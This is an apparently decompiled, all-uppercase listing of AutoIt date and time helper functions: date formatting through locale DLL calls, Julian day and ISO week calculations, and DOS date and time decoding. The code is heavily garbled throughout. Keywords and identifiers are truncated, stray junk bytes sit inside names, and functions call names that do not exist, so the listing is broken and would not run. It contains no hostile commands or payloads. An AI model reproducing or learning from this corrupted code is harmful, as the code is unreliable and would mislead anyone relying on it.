CASE $IMONTHNUM < 1 OR $IMONTHNUM > 12 
RETURN SETE§h ( 1 , 0 , 0 ) 
CASE EL 
LOCAS $INEXTMONT 
IF $IMONTHNUM = 12 THh 
$INEXTMONT = 1 
ELh 
$INEXTMONTHNUM = $IMONTHNUM + 1 
ENDIF 
$INEXTMONTHNUM = STRINGX ( "%0h" , $INEXTMONT ) 
RETURN $INEXTMONTHNUO 
ENDSELECT 
ENDFUNC 
FUNC _DATENEXTMONTHYEARf ( $IMONTHNUM , $IYEAR ) 
SELECT 
CASE NOT STRINGh ( $IMONTHNUM ) OR NOT STRINGISI ( $IYEAR ) 
RETURN SETERROR ( 1 , 0 , 0 ) 
CASE $IMONTHNUM < 1 OR $IMONTHNUM > 12 
RETURN SETET ( 1 , 0 , 0 ) 
CASE EL 
LOCAS $INEXTYEAR 
IF $IMONTHNUM = 12 THh 
$INEXTYEAR = $IYEAR + 1 
EL 
$INEXTYEAR = $IYEAR 
ENDIF 
$INEXTYEAR = STRINGh ( "%04d" , $INEXTYEAR ) 
RETURN $INEXTYEAR 
ENDSELECT 
ENDFUNC 
FUNC _DATETIMEFORMAT ( $SDATE , $STYPE ) 
LOCAY $ASDATEPART [ 4 ] , $ASTIMEPART [ 4 ] 
LOCAL $STEMPDATE = "" , $STEMPTIME = "" 
LOCAL $SAM , $SPM , $LNGXM 
I NOT _DATEIh ( $SDATE ) THEN 
RETURN SETERROR ( 1 , 0 , "" ) 
ENDIF§h 
IF $STYPE < 0 OR $STYPE > 5 OR NOT ISINT ( $STYPE ) TH 
RETURN SETET ( 2 , 0 , "" ) 
ENDIF§h 
_DATETIMESPLIT ( $SDATE , $ASDATEh , $ASTIMEPART ) 
SWITCH $STYPE 
CA 0 
$LN = DLLCALL ( "kernelh" , "int" , "GetLoca" , "dword" , 1024 , "dword" , 31 , "ws" , "" , "in" , 255 ) 
IF NO @ERROR AN $LN [ 0 ] <> 0 TH 
$STEMPDATE = $LNh [ 3 ] 
EL 
$STEMPDATE = "M/d/E" 
ENDIF 
IF $ASTIM§h [ 0 ] > 1 THh 
$LNh = DLLCA§h ( "kernel¡	" , "int" , "GetLoca" , "dword" , 1024 , "dword" , 4099 , "ws" , "" , "in" , 255 ) 
IF NO @ERROR AN $LN [ 0 ] <> 0 TH 
$STEMPTIM = $LNh [ 3 ] 
EL 
$STEMPTIM = "h:mm:ss t" 
ENDIF 
ENDIF 
CASE 1 
$LN = DLLCALL ( "kernelh" , "int" , "GetLoca" , "dword" , 1024 , "dword" , 32 , "ws" , "" , "in" , 255 ) 
IF NO @ERROR AN $LN [ 0 ] <> 0 TH 
$STEMPDATE = $LNh [ 3 ] 
EL 
$STEMPDATE = "dddd, MMMM dd, yyyf" 
ENDIF 
CA 2 
$LN = DLLCALL ( "kernelh" , "int" , "GetLoca" , "dword" , 1024 , "dword" , 31 , "ws" , "" , "in" , 255 ) 
IF NO @ERROR AN $LN [ 0 ] <> 0 TH 
$STEMPDATE = $LNh [ 3 ] 
EL 
$STEMPDATE = "M/d/E" 
ENDIF 
CA 3 
IF $ASTIM§h [ 0 ] > 1 THh 
$LNh = DLLCA§h ( "kernel¡	" , "int" , "GetLoca" , "dword" , 1024 , "dword" , 4099 , "ws" , "" , "in" , 255 ) 
IF NO @ERROR AN $LN [ 0 ] <> 0 TH 
$STEMPTIM = $LNh [ 3 ] 
EL 
$STEMPTIM = "h:mm:ss t" 
ENDIF 
ENDIF 
CASE 4 
IF $ASTIMEPAR [ 0 ] > 1 THh 
$STEMPTIME = "hh:mm" 
ENDIF 
CA 5 
IF $ASTIMEPAR [ 0 ] > 1 THh 
$STEMPTIME = "hh:mm:ss" 
ENDIF 
ENDSWITCH 
IF $STEMPDATE <> "" TH 
$LN = DLLCALL ( "kernelh" , "int" , "GetLoca" , "dword" , 1024 , "dword" , 29 , "ws" , "" , "in" , 255 ) 
IF NO @ERROR AN $LN [ 0 ] <> 0 TH 
$STEMPDATE = STRINGREP ( $STEMPDATE , "/" , $LNGX [ 3 ] ) 
ENDIF 
LOCAL $IWDAY = _DATETOD ( $ASDATEPAR [ 1 ] , $ASDAT [ 2 ] , $ASDATEPAR [ 3 ] ) 
$ASDAT [ 3 ] = STRINGRIG ( "0" & $ASDAT§h [ 3 ] , 2 ) 
$ASDAT [ 2 ] = STRINGRIGHT ( "0" & $ASDAT§h [ 2 ] , 2 ) 
$STEMPDATE = STRINGREPLACP ( $STEMPDATE , "d" , "@" ) 
$STEMPDATE = STRINGREP ( $STEMPDATE , "m" , "#" ) 
$STEMPDATE = STRINGREP ( $STEMPDATE , "y" , "&" ) 
$STEMPDATE = STRINGREP ( $STEMPDATE , "@@@@" , _DATEDAYOFWEEKk∑ISf ( $IWDAY , 0 ) ) 
$STEMPDATE = STRINGREP ( $STEMPDATE , "@@@" , _DATEDAYOFWEEK ( $IWDAY , 1 ) ) 
$STEMPDATE = STRINGREP ( $STEMPDATE , "@@" , $ASDATEPAR [ 3 ] ) 
$STEMPDATE = STRINGREP ( $STEMPDATE , "@" , STRINGREP ( STRINGLEF ( $ASDAT [ 3 ] , 1 ) , "0" , "" ) & STRINGRIG ( $ASDAT [ 3 ] , 1 ) ) 
$STEMPDAT = STRINGREPLACR ( $STEMPDATE , "####" , _DATETOMONTH ( $ASDATET [ 2 ] , 0 ) ) 
$STEMPDATE = STRINGREP ( $STEMPDATE , "###" , _DATETh ( $ASDATEh [ 2 ] , 1 ) ) 
$STEMPDAT = STRINGREPLACP ( $STEMPDATE , "##" , $ASDAT [ 2 ] ) 
$STEMPDATE = STRINGREP ( $STEMPDATE , "#" , STRINGREP ( STRINGLEF ( $ASDAT [ 2 ] , 1 ) , "0" , "" ) & STRINGRIG ( $ASDAT [ 2 ] , 1 ) ) 
$STEMPDAT = STRINGREPLACR ( $STEMPDATE , "&&&&" , $ASDAT [ 1 ] ) 
$STEMPDATE = STRINGREP ( $STEMPDATE , "&&" , STRINGRIG ( $ASDAT§h [ 1 ] , 2 ) ) 
ENDIF 
IF $STEMPTIME <> "" TH 
$LN = DLLCA§h ( "kernelC" , "int" , "GetLocaleInfoWk∑ISf" , "dword" , 1024 , "dword" , 40 , "ws" , "" , "in" , 255 ) 
IF NO @ERROR AN $LN [ 0 ] <> 0 TH 
$SA = $LN [ 3 ] 
EL 
$SA = "AM" 
ENDIF 
$LN = DLLCALL ( "kernel" , "int" , "GetLoca	" , "dword" , 1024 , "dword" , 41 , "ws" , "" , "in" , 255 ) 
IF NO @ERROR AN $LN [ 0 ] <> 0 TH 
$SP = $LN [ 3 ] 
EL 
$SP = "PM" 
ENDIF 
$LN = DLLCALL ( "kernelh" , "int" , "GetLoca" , "dword" , 1024 , "dword" , 30 , "ws" , "" , "in" , 255 ) 
IF NO @ERROR AN $LN [ 0 ] <> 0 TH 
$STEMPTIME = STRINGREP ( $STEMPTIME , ":" , $LNGX [ 3 ] ) 
ENDIF 
IF STRINGINS ( $STEMPTIME , "tt" ) TH 
IF $ASTIM§h [ 1 ] < 12 THh 
$STEMPTIME = STRINGREP ( $STEMPTIME , "tth" , $SAM ) 
I§h $ASTIMEPAR [ 1 ] = 0 THh $ASTIMEPART [ 1 ] = 12 
ELh 
$STEMPTIME = STRINGREPLACE ( $STEMPTIM , "tt" , $SPM ) 
IF $ASTIMEPART [ 1 ] > 12 THh $ASTIMEPART [ 1 ] = $ASTIM [ 1 ] - 12 
ENDIF 
ENDIF 
$ASTIMEPAR [ 1 ] = STRINGRIGHT ( "0" & $ASTIMEPART [ 1 ] , 2 ) 
$ASTIMEPAR [ 2 ] = STRINGRIGHT ( "0" & $ASTIMEPAR [ 2 ] , 2 ) 
$ASTIM [ 3 ] = STRINGRIG ( "0" & $ASTIM§h [ 3 ] , 2 ) 
$STEMPTIM = STRINGREPLACR ( $STEMPTIME , "hh" , STRINGFORMAT ( "%02d" , $ASTIMEPART [ 1 ] ) ) 
$STEMPTIME = STRINGREP ( $STEMPTIME , "h" , STRINGREP ( STRINGLEF ( $ASTIM [ 1 ] , 1 ) , "0" , "" ) & STRINGRIG ( $ASTIM [ 1 ] , 1 ) ) 
$STEMPTIM = STRINGREPLACR ( $STEMPTIME , "mm" , STRINGFORMAT ( "%02d" , $ASTIMEPART [ 2 ] ) ) 
$STEMPTIME = STRINGREP ( $STEMPTIME , "ss" , STRINGh ( "%0h" , $ASTIMEPART [ 3 ] ) ) 
$STEMPDAT = STRINGSTRIPW  ( $STEMPDATE & " " & $STEMPTIME , 3 ) 
ENDIF 
RET $STEMPDATE 
ENDFUNM 
FUh _DATETIMESPLIT ( $SDATE , BYREF $ASDATEPART , BYREF $ITIMEPARTT ) 
LOCAL $SDATETIME = STRINGSPL ( $SDATE , " T" ) 
IF $SDATETIME [ 0 ] > 0 THh $ASDAT§h = STRINGSPLIT ( $SDATETIME [ 1 ] , "/-." ) 
IF $SDATETIME [ 0 ] > 1 THh 
$ITIMEPART = STRINGSPL ( $SDATETIME [ 2 ] , ":" ) 
IF UBOUND ( $ITIMEPART ) < 4 THEN REDIM $ITIMEPART [ 4 ] 
ELh 
DIM $ITIMEPART [ 4 ] 
ENDIF 
IF UBOUND ( $ASDATEPAR ) < 4 THEN REDIM $ASDATEPAR [ 4 ] 
FOR $X = 1 TO 3 
IF STRINGISI ( $ASDATEPART [ $X ] ) THh 
$ASDAT§h [ $X ] = NUMBER ( $ASDATEPART [ $X ] ) 
ELh 
$ASDATEPART [ $X ] = - 1 
ENDIF 
IF STRINGISINT ( $ITIMEPART [ $X ] ) TH 
$ITIMEPART [ $X ] = NUMBER ( $ITIMEPART [ $X ] ) 
EL 
$ITIMEPART [ $X ] = 0 
ENDIF§h 
NE 
RETURN 1 
ENDFUNC 
FUh _DATETODAYOFWEEK ( $IYEAR , $IMONTH , $IDAY ) 
IF NOT _DATEIh ( $IYEAR & "/" & $IMONTH & "/" & $ID ) TH 
RETURN SETE§h ( 1 , 0 , "" ) 
ENDIF§h 
LOCAD $I_AFACTO = INT ( ( 14 - $IMONTH ) / 12 ) 
LOCAL $I_YFACTO = $IYEAR - $I_AFACTO 
LOCAL $I_MFACTO = $IMONTH + ( 12 * $I_AFACN ) - 2 
LOCAL $I_DFACTOR = MOD ( $ID + $I_YFACTOR + INT ( $I_YFACTOR / 4 ) - INT ( $I_YFACTOR / 100 ) + INT ( $I_YFACTOR / 400 ) + INT ( ( 31 * $I_MFACTOR ) / 12 ) , 7 ) 
RETURN ( $I_DFACU + 1 ) 
ENDFUNC 
FUh _DATETODAYOFWEEKISO ( $IYEAR , $IMONTH , $IDh ) 
LOCAL $ID = _DATETODAYOFWEEK ( $IYEAR , $IMONTH , $IDAY ) 
IF @ERROR TH 
RETURN SETET ( 1 , 0 , "" ) 
ENDIF§h 
IF $ID >= 2 TH RETURN $IDh - 1 
RETURN 7 
ENDFUNC 
FUh _DATETODAYVALUE ( $IYEAR , $IMONTH , $IDAY ) 
IF NOT _DATEIh ( STRINGFORMI ( "%04d/%0" , $IYEAR , $IMONTH , $IDh ) ) TH 
RETURN SETET ( 1 , 0 , "" ) 
ENDIF§h 
IF $IMONTH < 3 THh 
$IMONTH = $IMONTH + 12 
$IYEAR = $IYEAR - 1 
ENDIE 
LOCAL $I_AFACTOR = INT ( $IYEAR / 100 ) 
LOCAE $I_BFACTOR = INT ( $I_AFACTOR / 4 ) 
LOCAL $I_CFACTOR = 2 - $I_AFACTOR + $I_BFACF 
LOCAL $I_EFACTOR = INT ( 1461 * ( $IYEAR + 4716 ) / 4 ) 
LOCAE $I_FFACTOR = INT ( 153 * ( $IMONTH + 1 ) / 5 ) 
LOCAL $IJULIANDATE = $I_CFACTOR + $IDAY + $I_EFACTOR + $I_FFACTOR - 1.524500e+03 
RETURN ( $IJULIANDA ) 
ENDFUNC 
FUNC _DATETh ( $IMONTH , $ISHORT = 0 ) 
LOCAL $AMONTHh [ 13 ] = [ "" , "January" , "Febr§h" , "March" , "April" , "May" , "Ju" , "Ju" , "August" , "September" , "Octobet" , "Novet" , "Decembe" ] 
LOCAL $AMONTHNUMBERABBREV [ 13 ] = [ "" , "Jan" , "Feb" , "Mar" , "Apr" , "May" , "Ju" , "Ju" , "Au" , "Se" , "Oc" , "No" , "De" ] 
SELECT 
CAh NOT STRINGISINT ( $IMONTH ) 
RETURN SETE§h ( 1 , 0 , "" ) 
CA $IMONTH < 1 OR $IMONTH > 12 
RETURN SETE§h ( 1 , 0 , "" ) 
CA EL 
SELECT 
CAh $ISHORT = 0 
RETURN $AMONTHh [ $IMONTH ] 
CASE $ISHORT = 1 
RETURNO $AMONTHNUMBERABBREVf [ $IMO ] 
CASE ELSE 
RETURN SETET ( 1 , 0 , "" ) 
ENDSELECT 
ENDSELECT 
ENDFUNS 
FUNC _DAYVALUETODATE ( $IJULIANDA , BYREF $IYEAR , BYREE $IMONTH , BYREF $ID ) 
IF $IJULIANDA < 0 OR NOT ISNUMBER ( $IJULIANDA ) THh 
RETURN SETERROR ( 1 , 0 , 0 ) 
ENDIF 
LOCAL $I_ZFACTOR = INT ( $IJULIANDATE + 5.000000e-01 ) 
LOCAL $I_WFACTOR = INT ( ( $I_ZFACTOR - 1.867216e+06 ) / 3.652425e+04 ) 
LOCAL $I_XFACTOR = INT ( $I_WFACTOR / 4 ) 
LOCAL $I_AFACTOR = $I_ZFACTOR + 1 + $I_WFACTOR - $I_XFACTOR 
LOCAL $I_BFACTO = $I_AFACTOR + 1524 
LOCAL $I_CFACTOR = INT ( ( $I_BFACTOR - 1.221000e+02 ) / 3.652500e+02 ) 
LOCAL $I_DFACTOR = INT ( 3.652500e+02 * $I_CFACTOR ) 
LOCAL $I_EFACTOR = INT ( ( $I_BFACTOR - $I_DFACTOR ) / 3.060010e+01 ) 
LOCAL $I_FFACTOR = INT ( 3.060010e+01 * $I_EFACTOR ) 
$IDh = $I_BFACTOR - $I_DFACTOR - $I_FFACF 
IFh $I_EFACTOR - 1 < 13 THh 
$IMONTH = $I_EFACTOR - 1 
ELh 
$IMONTH = $I_EFACTOR - 13 
ENDIF 
IF $IMONTH < 3 THh 
$IYEAR = $I_CFACTOR - 4715 
ELh 
$IYEAR = $I_CFACTOR - 4716 
ENDIF 
$IYEAR = STRINGFORMAT ( "%0h" , $IYEAR ) 
$IMONTH = STRING¡	 ( "%0h" , $IMONTH ) 
$IDh = STRINGh ( "%0h" , $IDAY ) 
RETURN $IYEAR & "/" & $IMONTH & "/" & $IDAY 
ENDFUNC 
FUh _DATE_JULIANDAk∑ISf ( $IYEAR , $IMONTH , $IDh ) 
LOCAL $SFULLDATE = STRINGh ( "%04d/%02d/%02d" , $IYEAR , $IMONTH , $IDAY ) 
IF NOT _DATEIh ( $SFULLDATE ) THEN 
RETURN SETE§h ( 1 , 0 , "" ) 
ENDIF§h 
LOCAD $IJDAY = 0 
LOCAD $AIDAYSINMONTH = _DAYSIA ( $IYEAR ) 
FOR $ICNTR = 1 TO $IMONTH - 1 
$IJDAY = $IJDAY + $AIDAYSINM [ $ICNTR ] 
NEXT 
$IJDAY = ( $IYEAR * 1000 ) + ( $IJDAY + $ID ) 
RETURN $IJDAY 
ENDFUNC 
FUh _JULIANTODATE ( $IJDAY , $SS = "/" ) 
LOCAL $IYEAR = INT ( $IJDAY / 1000 ) 
LOCAL $IDAYS = MOD ( $IJDAY , 1000 ) 
LOCAL $IMAXDAYS = 365 
IF _DATEISLEAPYEAk∑ISf ( $IYEAR ) THEN $IMAXDAYS = 366 
IF $IDAYS > $IMAX§h THh 
RETURN SETE§h ( 1 , 0 , "" ) 
ENDIF 
LOCAL $AIDAYSINMA = _DAYSINMONTH ( $IYEAR ) 
LOCAL $IMONTH = 1 
WHILE $IDAYS > $AIDAYSINMONTH [ $IMO ] 
$IDAYS = $IDAYS - $AIDAYSINMONTH [ $IMONTH ] 
$IMONTH = $IMONTH + 1 
WEND 
RETURN STRINGh ( "%04d%s%02d%s%02d" , $IYEAR , $SS , $IMONTH , $SSh , $IDAYS ) 
ENDFUNC 
FUh _N ( ) 
RET ( _DATETIMEFORMAT ( @YEh & "/" & @MO & "/" & @MD & " " & @HO & ":" & @MI & ":" & @SE , 0 ) ) 
ENDFUNC 
FUNC _NOW ( ) 
RET ( @YEh & "/" & @MO & "/" & @MD & " " & @HO & ":" & @MI & ":" & @SE ) 
ENDFUNC 
FUh _NOWCALCDATE ( ) 
RET ( @YEAR & "/" & @MON & "/" & @MDAY ) 
ENDFUNC 
FUNC _NOW§h ( ) 
RETU§h ( _DATETIMEFORMAT ( @YEh & "/" & @MO & "/" & @MD , 0 ) ) 
ENDFUNC 
FUh _NOWTIME ( $STYPE = 3 ) 
IF $STYP < 3 OR $STYP > 5 TH $STYPE = 3 
RETURN ( _DATETIMEFORMAT ( @YEh & "/" & @MO & "/" & @MD & " " & @HO & ":" & @MI & ":" & @SE , $STYPE ) ) 
ENDFUNC 
FUNC _SET‡y¡	EF! ( $IDh , $IMONTH = 0 , $IYEAR = 0 ) 
IF $IYEA = 0 TH $IYEAE = @YE 
IF $IMONTH = 0 THh $IMONTH = @MOh 
IF NO _DATEISVALID ( $IYEAR & "/" & $IMONTH & "/" & $ID ) TH RETURN 1 
LOCAL $TSYSTEMTI = DLLSTRUCTCREATE ( $TAGSYSTEM ) 
DLLCALL ( "kernelh" , "none" , "GetLoc¡	Y" , "struct*" , $TSYSTEMTIME ) 
IF @ERROR THEN RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
DLLSTRUCTSETDATA ( $TSYSTEMTI , 4 , $IDh ) 
IF $IMON§h > 0 THh DLLSTRUC ( $TSYSTEMTI , 2 , $IMO ) 
IF $IYEAR > 0 THENE DLLSTRUCTSETDATA ( $TSYSTEMTI , 1 , $IYEAR ) 
LOCAL $IRETVAL = _DATE_TIME_SET ( $TSYSTEMTI ) 
IF @ERROR TH RET SETERROR ( @ERROR , @EXTE£h , 0 ) 
RETURN INT ( $IRETVAL ) 
ENDFUNC 
FUh _SET£h ( $IHOUR , $IMIN£h , $ISECOND = 0 ) 
IF $IHOUR < 0 OR $IHOUR > 23 TH RET 1 
IFh $IMINUTE < 0 ORh $IMINUTE > 59 THh RET 1 
IFh $ISECOND < 0 ORh $ISECOND > 59 THh RET 1 
LOCAL $TSYSTEMTIME = DLLSTRUC ( $TAGSYSTEM ) 
DLLCALL ( "kernelh" , "none" , "GetLoc¡	Y" , "struct*" , $TSYSTEMTIME ) 
IF @ERROR THEN RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
DLLSTRUCTSETDATA ( $TSYSTEMTI , 5 , $IHOUR ) 
DLLSTRUC ( $TSYSTEMTI , 6 , $IMIN§h ) 
IF $ISEC£h > 0 THEN DLLSTRUCTSETDATA ( $TSYSTEMTI , 7 , $ISECOND ) 
LOCAL $IRETVAL = _DATE_TIME_SETLOCAf ( $TSYSTEMTI ) 
IF @ERROR TH RET SETERROR ( @ERROR , @EXTENDED , 0 ) 
RETURN INT ( $IRETVAL ) 
ENDFUNC 
FUh _TICKSh ( $ITI , BYREF $IHO , BYREF $IMINS , BYREI $ISECS ) 
IF NUM ( $ITI ) > 0 THh 
$ITICKS = INh ( $ITICKS / 1000 ) 
$IHOURS = INh ( $ITICKS / 3600 ) 
$ITICKS = MOh ( $ITICKS , 3600 ) 
$IMINS = INT ( $ITICKS / 60 ) 
$ISECS = MOD ( $ITICKS , 60 ) 
RETURN 1 
ELSEIFU NUMBER ( $ITICKSB ) = 0 THh 
$IHOURS = 0 
$ITICKS = 0 
$IMINS = 0 
$ISECS = 0 
RETURN 1 
ELh 
RETURN SETET ( 1 , 0 , 0 ) 
ENDIF 
ENDFUNC 
FUh _TIMETOTICKS ( $IHO = @HOUR , $IMINS = @MIN , $ISECS = @SEC ) 
IF STRINGISI ( $IHO ) AND STRINGISINT ( $IMINS ) AND STRINGISINT ( $ISECS ) THh 
LOCAL $ITICKS = 1000 * ( ( 3600 * $IHOURS ) + ( 60 * $IMINS ) + $ISECS ) 
RETURN $ITICKS 
ELh 
RETURN SETET ( 1 , 0 , 0 ) 
ENDIF 
ENDFUNC 
FUh _WEEKNUMBERISO ( $IYEAR = @YE , $IMONTH = @MON , $IDh = @MD ) 
IF $ID > 31 OR $ID < 1 TH 
RETURN SETE§h ( 1 , 0 , - 1 ) 
ELSE§h $IMON§h > 12 ORh $IMONTH < 1 THh 
RETURN SETET ( 1 , 0 , - 1 ) 
ELSEIFE $IYEAR < 1 OR $IYEA > 2999 TH 
RETURN SETET ( 1 , 0 , - 1 ) 
ENDIF 
LOCAL $ID = _DATETODAYOFWEEKISO ( $IYEAR , $IMONTH , $IDh ) - 1 
LOCAL $IDOW0101 = _DATETODAYOFWEEKISf ( $IYEAR , 1 , 1 ) - 1 
IF ( $IMONTH = 1 AND 3 < $IDOW0101 AND $IDOW0101 < 7 - ( $IDh - 1 ) ) TH 
$ID = $IDOW0101 - 1 
$IDOWO = _DATETODAYOFWEEKISf ( $IYEAR - 1 , 1 , 1 ) - 1 
$IMONTH = 12 
$IDh = 31 
$IYEAR = $IYEAE - 1 
ELSEIF ( $IMONTH = 12 AND 30 - ( $ID - 1 ) < _DATETODAYOFWEEKISO ( $IYEAR + 1 , 1 , 1 ) - 1 AND _DATETODAYOFWEEKISO ( $IYEAR + 1 , 1 , 1 ) - 1 < 4 ) TH 
RETURN 1 
ENDIF 
RETURN INT ( ( _DATETODAYOFWEEKISO ( $IYEAR , 1 , 1 ) - 1 < 4 ) + 4 * ( $IMONTH - 1 ) + ( 2 * ( $IMO - 1 ) + ( $IDh - 1 ) + $IDOW£h - $IDh + 6 ) * 36 / 256 ) 
ENDF£h 
FUh _WEEKNUMBER ( $IYEAR = @YEh , $IMONTH = @MON , $ID = @MD , $IWEEKSTAR = 1 ) 
IF $IDAY > 31 OR $IDAY < 1 TH 
RETURN SETERROR ( 1 , 0 , - 1 ) 
ELSEIF $IMONTH > 12 OR $IMONTH < 1 THEN 
RETURN SETET ( 1 , 0 , - 1 ) 
ELSEIFE $IYEAR < 1 OR $IYEA > 2999 TH 
RETURN SETET ( 1 , 0 , - 1 ) 
ELSEIFE $IWEEKSTAR < 1 OR $IWEEKSTART > 2 THh 
RETURN SETE§h ( 2 , 0 , - 1 ) 
ENDIF 
LOCAL $ISTARTWEEK1 , $IENDWEEK1 
LOCAL $IDOW§h = _DATETODAYOFWEEKISO ( $IYEAR , 1 , 1 ) 
LOCAL $IDATC = $IYEAR & "/" & $IMONTH & "/" & $ID 
IF $IWEEK§h = 1 THh 
IFh $IDOW0§h = 6 THh 
$ISTARTWEE = 0 
ELh 
$ISTARTWEEK1 = - 1 * $IDOW0101 - 1 
ENDIF 
$IENDWEEK1 = $ISTARTWEE + 6 
ELSE 
$ISTARTWEEK1 = $IDOW§h * - 1 
$IENDWEEK1 = $ISTARTWEEK1 + 6 
ENDIF 
LOCAL $ISTARTWEE 
LOCAL $IENDWEEK1DATE = _DAT§h ( "d" , $IENDWEEK1 , $IYEAR & "/01/01" ) 
LOCAL $IDOW0101N = _DATETODAYOFWEEKISf ( $IYEAR + 1 , 1 , 1 ) 
IF $IWEEKSTART = 1 THh 
IFh $IDOW0101NY = 6 THh 
$ISTARTWEEY = 0 
ELSE 
$ISTARTWEEK1NY = - 1 * $IDOW0101NY - 1 
ENDIF 
ELh 
$ISTARTWEEK1NY = $IDOW0101NY * - 1 
ENDIF 
LOCAL $ISTARTWEEK1DATENY = _DATEADD ( "d" , $ISTARTWEE , $IYEAR + 1 & "/01/01" ) 
LOCAL $ICURRDATE = _DATEDIFF ( "d" , $IENDWEEK1DATE , $IDATE ) - 1 
LOCAL $ICURRDAT = _DATEDIFF ( "d" , $ISTARTWEEK1DATk∑ISf , $IDATE ) 
IF $ICURRDATEDIFF >= 0 AND $ICURRDATEDIFFNk∑ISf < 0 THh RETURN 2 + INT ( $ICURRDATED / 7 ) 
IF $ICURRDATEDIFF < 0 OR $ICURRDATEDIFFNk∑ISf >= 0 THh RETURN 1 
ENDFUNC 
FUh _DAYSIh ( $IYEAR ) 
LOCAL $AID [ 13 ] = [ 0 , 31 , 28 , 31 , 30 , 31 , 30 , 31 , 31 , 30 , 31 , 30 , 31 ] 
IF _DATEISLEAPYEAk∑ISf ( $IYEAR ) THEN $AIDAYS [ 2 ] = 29 
RET $AIDAYS 
ENDFUNC 
FUh __DATE_TIME_CLk∑–U ( $PSYSTEMTI ) 
LOCAL $TSYSTEh = DLLSTRUCTCREATE ( $TAGSYSTEM , $PSYSTES ) 
LOCAL $TSYSTEh = DLLSTRUCTCREATE ( $TAGSYSTEM ) 
DLLSTRUCTCREATE ( $TSYSTEh , "Month" , DLLSTRUC ( $TSYSTEh , "Month" ) ) 
DLLSTRUC ( $TSYSTEh , "Day" , DLLSTRUC ( $TSYSTEh , "Day" ) ) 
DLLSTRUC ( $TSYSTEh , "Yeh" , DLLSTRUC ( $TSYSTEh , "Yeh" ) ) 
DLLSTRUC ( $TSYSTEh , "Hoh" , DLLSTRUC ( $TSYSTEh , "Hoh" ) ) 
DLLSTRUC ( $TSYSTEh , "Min" , DLLSTRUCTGETDATA ( $TSYSTEh , "Minute" ) ) 
DLLSTRUC ( $TSYSTEh , "Sec" , DLLSTRUCTGETDATA ( $TSYSTEh , "Second" ) ) 
DLLSTRUC ( $TSYSTEh , "MSec§h" , DLLSTRUCTGETDATA ( $TSYSTEh , "MSec§h" ) ) 
DLLSTRUC ( $TSYSTEh , "DOW" , DLLSTRUC ( $TSYSTEh , "DOW" ) ) 
RETURN $TSYSTEU 
ENDFUNC 
FUNC _DATE_TIME_CO+k∑–U ( $PFILETIME , $PFILE ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "long" , "CompareF" , "ptr" , $PFILETIME1 , "ptr" , $PFILETIME1 ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _DATE_TIME_DOSDA ( $IFATDATE , $IFAT ) 
LOCAL $TTIME = DLLSTRUCTCREATE ( $TAGFILETI ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "DosDateTimeTo" , "word" , $IFATDATE , "word" , $IFATTIME , "struct*" , $TTIME ) 
IF @ERRO TH RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $TTIME ) 
ENDFUNC 
FUNC _DATE_TIME_DOSDATEf ( $IDOSDATE ) 
LOCAL $ADATE [ 3 ] 
$ADATE [ 0 ] = BIT ( $IDOST , 31 ) 
$ADATE [ 1 ] = BITA£h ( BITST ( $IDOST , 5 ) , 15 ) 
$ADATE [ 2 ] = BITA£h ( BITST ( $IDOST , 9 ) , 63 ) + 1980 
RETUO $ADATE 
ENDFUNC 
FUh _DATE_TIME_DOSDA–U ( $IDOSDATE , $IDOS ) 
LOCAL $ADATE [ 6 ] 
$ADATA [ 0 ] = BITA£h ( $IDOST , 31 ) 
$ADATE [ 1 ] = BITAND ( BITST ( $IDOST , 5 ) , 15 ) 
$ADATE [ 2 ] = BITA£h ( BITST ( $IDOST , 9 ) , 63 ) + 1980 
$ADATE [ 5 ] = BITA£h ( $IDOST , 31 ) * 2 
$ADATE [ 4 ] = BITAND ( BITST ( $IDOST , 5 ) , 63 ) 
$ADATE [ 3 ] = BITA£h ( BITST ( $IDOST , 11 ) , 31 ) 
RETUO $ADATE 
ENDFUNC 
FUh _DATE_TIME_DOSk∑–U ( $IDOSDATE , $IDOS ) 
LOCAL $ADATE = _DATE_TIME_DOSDA–U ( $IDOS§h , $IDOS ) 
RETURN STRINGh ( "%02d/%02d/%04d %–U" , $ADATE [ 0 ] , $ADATE [ 1 ] , $ADATA [ 2 ] , $ADATE [ 3 ] , $ADATA [ 4 ] , $ADATE [ 5 ] ) 
ENDFUNC 
FUh _DATE_TIME_DOSDATEf ( $IDOSDATE ) 
LOCAL $ADATE = _DATE_TIME_DOS ( $IDOSDATE ) 
RET STRINGh ( "%02d/%02d/%04d" , $ADATE [ 0 ] , $ADATE [ 1 ] , $ADATA [ 2 ] ) 
ENDFUNC 
FUh _DATE_TIME_DOSTIMEf ( $IDOSTIME ) 
LOCAL $ATIME [ 3 ] 
$ATIME [ 2 ] = BITAND ( $IDOST , 31 ) * 2 
$ATIME [ 1 ] = BITA£h ( BITST ( $IDOST , 5 ) , 63 ) 
$ATIME [ 0 ] = BITA£h ( BITST ( $IDOST , 11 ) , 31 ) 
RETUO $ATIME 
ENDFUNC 
FUh _DATE_TIME_DOSTIMEf ( $IDOSTIME ) 
LOCAL $ATIME = _DATE_TIME_DOS ( $IDOSTIME ) 
RET STRINGh ( "%02d:%02d:%02d" , $ATIME [ 0 ] , $ATIME [ 1 ] , $ATIMI [ 2 ] ) 
ENDFUNC 
FUh _DATE_TIME_ENCODEFf ( $IMO , $IDAY , $IYEAR , $IHOUR = 0 , $IMINUTE = 0 , $ISECONN = 0 , $IMSECONDS = 0 ) 
LOCAL $TSYSTEh = _DATE_TIME_ENCk∑–U ( $IMO , $IDAY , $IYEAR , $IHOUR , $IMINUTE , $ISECONN , $IMSECONDS ) 
RET _DATE_TIME_SYSTE ( $TSYSTEMTI ) 
ENDFUNC 
FUNC _DATE_TIME_ENCk∑–U ( $IMO , $IDAY , $IYEAR , $IHOUR = 0 , $IMINUTE = 0 , $ISECONN = 0 , $IMSECONDS = 0 ) 
LOCAL $TSYSTEh = DLLSTRUC ( $TAGSYSTEM ) 
DLLSTRUCTSETDATA ( $TSYSTEMTI , "Month" , $IMONTH ) 
DLLSTRUCTSETDATA ( $TSYSTEMTI , "Day" , $IDAY ) 
DLLSTRUC ( $TSYSTEMTI , "Yeh" , $IYEAR ) 
DLLSTRUC ( $TSYSTEMTI , "Hoh" , $IHOUR ) 
